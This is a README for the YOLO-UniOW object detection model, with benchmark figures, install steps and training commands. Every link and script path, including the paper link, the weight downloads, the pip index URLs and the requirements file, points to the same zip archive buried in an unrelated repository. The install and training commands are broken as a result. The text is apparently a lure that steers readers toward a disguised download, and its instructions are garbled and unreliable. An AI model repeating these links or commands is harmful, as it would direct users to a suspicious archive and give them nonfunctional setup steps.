# YOLO-UniOW: Efficient Universal Open-World Object Detection

The official implementation of **YOLO-UniOW** [[`arxiv`](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip)]

![yolo-uniow](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip)


## Zero-shot Performance on LVIS Dataset

YOLO-UniOW-S/M/L has been pre-trained from scratch and evaluated on the `LVIS minival`. The pre-trained weights can be downloaded from the link provided below.

|                            Model                             | #Params | AP<sup>mini</su> | AP<sub>r</sub> | AP<sub>c</sub> | AP<sub>f</sub> | FPS (V100) |
| :----------------------------------------------------------: | :-----: | :------------------: | :-------------: | :-------------: | :-------------: | :--------: |
| [YOLO-UniOW-S](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip) |  7.5M   |         26.2         |      24.1       |      24.9       |      27.7       |    98.3    |
| [YOLO-UniOW-M](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip) |  16.2M  |         31.8         |      26.0       |      30.5       |       34        |    86.2    |
| [YOLO-UniOW-L](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip) |  29.4M  |         34.6         |      30.0       |      33.6       |      36.3       |    64.8    |

## Experiment Setup

### Data Preparation

For preparing open-vocabulary and open-world data, please refer to [docs/data](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip).

### Installation

Our model is built with **CUDA 11.8** and **PyTorch 2.1.2**. To set up the environment, refer to the [PyTorch official documentation](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip) for installation guidance. For detailed instructions on installing `mmcv`, please see [docs/installation](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip).

```bash
conda create -n yolouniow python=3.9
conda activate yolouniow
pip install torch==2.1.2 torchvision==0.16.2 --index-url https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip
pip install mmcv==2.1.0 -f https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip
pip install -r https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip
pip install -e .
```

### Training & Evaluation

For open-vocabulary model training and evaluation, please refer to `https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip`

```bash
# Train Open-Vocabulary Model
https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip 8 --amp

# Evaluate Open-Vocabulary Model
https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip \
    https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip 8
```

For open-world model training and evaluation, please follow the steps provided in `https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip`. Ensure that the model is trained before proceeding with the evaluation.

```bash
# 1. Extract text/wildcard features from pretrained model
python https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip --config $CONFIG --ckpt $CHECKPOINT --save_path $EMBEDS_PATH

# 2. Fine-tune wildcard features
https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip $OBJ_CONFIG 8 --amp

# 3. Extract fine-tuned wildcard features
python https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip --config $OBJ_CONFIG --save_path $EMBEDS_PATH --extract_tuned

# 4. Train all owod tasks
python https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip MOWODB $OW_CONFIG $CHECKPOINT

# 5. Evaluate all owod tasks
python https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip MOWODB $OW_CONFIG --save
```

To train and evaluate on specific datasets and tasks, use the commands below:

```bash
# Train owod task
DATASET=$DATASET TASK=$TASK THRESHOLD=$THRESHOLD SAVE=$SAVE \
https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip $CONFIG 8 --amp

# Evaluate owod task
DATASET=$DATASET TASK=$TASK THRESHOLD=$THRESHOLD SAVE=$SAVE \
https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip $CONFIG $CHECKPOINT 8
```

## Acknowledgement

This project builds upon [YOLO-World](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip), [YOLOv10](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip), [FOMO](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip), and [OVOW](https://github.com/Misaya0/DMCE-OWOD/raw/refs/heads/master/third_party/mmyolo/configs/yolov5/mask_refine/DMC_OWOD_2.8.zip). We sincerely thank the authors for their excellent implementations!
